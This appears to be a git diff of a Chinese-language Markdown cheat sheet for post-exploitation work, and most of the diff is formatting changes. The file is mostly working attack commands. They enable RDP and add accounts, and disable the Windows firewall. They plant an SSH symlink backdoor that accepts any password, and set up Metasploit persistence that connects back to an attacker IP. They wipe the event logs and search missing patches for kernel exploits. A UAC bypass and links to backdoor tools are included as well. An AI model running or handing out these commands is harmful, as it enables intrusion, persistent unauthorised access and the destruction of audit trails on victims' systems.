@@ -1,4 +1,12 @@
-#  信息收集
+# 信息收集
+[后渗透之windows中无文件落地执行方法](https://mp.weixin.qq.com/s/-rN-rsnYRSKuJr5BkaRnBg)
+
+## web 路径
+
+```
+C:\tomcat\webapps\xxxx\WEB-INF\web.xml
+```
+
 ## windows
 
 ```shell
@@ -15,7 +23,7 @@ meterpreter > run getgui -u xiaowei -p 123456    # 创建用户
 # 远程桌面 要求的函数不受支持
 # reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /t reg_dword /v AllowEncryptionOracle /d 2
 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1                              # 开启3389远程桌面
-netsh advfirewall set allprofiles state off 
+netsh advfirewall set allprofiles state off
 netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes                                 # M2: 放行3389
 netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow # M1: 放行3389
 
@@ -43,8 +51,10 @@ CS和msf联动
 ## * 远程软件保存的远程连接 mstsc/内网通/向日葵/todesk等
 
 ```
+
 ### 多用户登录远程桌面
-[RDP连接多开方法与利用思路](https://mp.weixin.qq.com/s/GCFCIwqnQUAFNED0dTVDoA)
+
+[RDP 连接多开方法与利用思路](https://mp.weixin.qq.com/s/GCFCIwqnQUAFNED0dTVDoA)
 
 ```bash
 net user admin 123456 /add
@@ -59,55 +69,60 @@ rdpconf.exe  # 取消 Single Session
 ## 2.1 win10+win11 http://github.com/anhkgg/SuperRDP
 ```
 
+## linux
 
-## linux 
-[Linux内网渗透基础篇](https://mp.weixin.qq.com/s/MV4bTIW7YKiBgS6r03_FFw)
+[Linux 内网渗透基础篇](https://mp.weixin.qq.com/s/MV4bTIW7YKiBgS6r03_FFw)
+
 ```shell
 get_info_01_linux.sh
 meterpreter > getSystem "whoami"
 
 uname -a    # 获取所有版本信息
 uname -m    # 获取Linux内核架构
-cat /proc/version    # 获取内核信息 
+cat /proc/version    # 获取内核信息
 cat /etc/*-release   # 发布信息
 cat /etc/issue    # 发布信息
 hostname    # 获取主机名
-cat /etc/passwd    # 列出系统所有用户 
-cat /etc/group    # 列出系统所有组 
+cat /etc/passwd    # 列出系统所有用户
+cat /etc/group    # 列出系统所有组
 w    # 查看目前登录的用户
-whoami    # 查看当前用户 
-id    # 查看当前用户信息 
-sudo -l    # 列出目前用户可执行与无法执行的指令 
-ps aux    # 查看进程信息 
+whoami    # 查看当前用户
+id    # 查看当前用户信息
+sudo -l    # 列出目前用户可执行与无法执行的指令
+ps aux    # 查看进程信息
 ls -la /etc/cron*    # 查看计划任务
 ls -la /tmp
-ifconfig -a    # 列出网络接口信息 
-cat /etc/network/interfaces    # 列出网络接口信息 
-arp -a    # 查看系统arp表 
+ifconfig -a    # 列出网络接口信息
+cat /etc/network/interfaces    # 列出网络接口信息
+arp -a    # 查看系统arp表
 route    # 打印路由信息
-netstat -anplt    # 打印本地端口开放信息 
+netstat -anplt    # 打印本地端口开放信息
 iptables -L    # 列出iptable的配置规则
 ```
 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”
+
 ## 权限维持
 
-ssh软连接后门 需root执行后门命令，任意密码登录
+ssh 软连接后门 需 root 执行后门命令，任意密码登录
+
 ```shell
 ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
 ```
 
-* [msf](https://mp.weixin.qq.com/s/Ch73sZqK54HVlJQEhbBb6g)
+- [msf](https://mp.weixin.qq.com/s/Ch73sZqK54HVlJQEhbBb6g)
 
-msf 维持1 run persistence
+msf 维持 1 run persistence
+
 ```bash
 run persistence –h #查看帮助
 run persistence -U -i 5 -p 1234 -r 192.168.47.128
 #-U指定启动的方式为用户登录时，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
 ```
 
-msf 维持2 metsvc
+msf 维持 2 metsvc
+
 ```bash
 run metsvc –h # 查看帮助
 run metsvc –A #自动安装后门
@@ -116,13 +131,14 @@ run metsvc –A #自动安装后门
 ## 日志清除
 
 ```ps1
-$a=Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"  
+$a=Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"
 taskkill /F /PID $a.ProcessId
 del %SystemRoot%\System32\winevt\Logs\*
 net start EventLog
 ```
 
-# 04自动信息收集
+# 04 自动信息收集
+
 Host Information Gathering Script：HIGS.bat
 https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
 privilege-escalation-awesome-scripts：winPEAS.bat
@@ -132,20 +148,21 @@ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/m
 
 https://blog.csdn.net/weixin_43873557/article/details/113760973
 
-快速查找exp
+快速查找 exp
 
-systeminfo>micropoor.txt&(for %i in (   KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a  micropoor.txt
+systeminfo>micropoor.txt&(for %i in ( KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt
 
 https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/WindowsExploits/Exploits
 
 ## ssh 相关
-1.密钥篡改 authorized_keys 
-2.重装覆盖 openssh-backdoor https://github.com/Psmths/openssh-backdoor
+
+1.密钥篡改 authorized_keys 2.重装覆盖 openssh-backdoor https://github.com/Psmths/openssh-backdoor
 
 ### bypassuac
 
 1. msf
+
 ```bash
 search bypassuac
 use exploit/windows/local/bypassuac
@@ -155,8 +172,10 @@ run -j
 getuid
 getsystem
 ```
-2. CVE编号:CVE-2019-1388,windwos证书对话框特权提升漏洞。补丁号KB4524235 KB4525233
+
+2. CVE 编号:CVE-2019-1388,windwos 证书对话框特权提升漏洞。补丁号 KB4524235 KB4525233
 
 # Article
-[后渗透之windows中无文件落地执行方法](https://mp.weixin.qq.com/s/GqgFDi8hJ3NcN8c98yIXuw)
-[后渗透之windows中远程下载文件tips](https://mp.weixin.qq.com/s/Ax0CaErM3F6VCctTB2KaHA)
+
+[后渗透之 windows 中无文件落地执行方法](https://mp.weixin.qq.com/s/GqgFDi8hJ3NcN8c98yIXuw)
+[后渗透之 windows 中远程下载文件 tips](https://mp.weixin.qq.com/s/Ax0CaErM3F6VCctTB2KaHA)
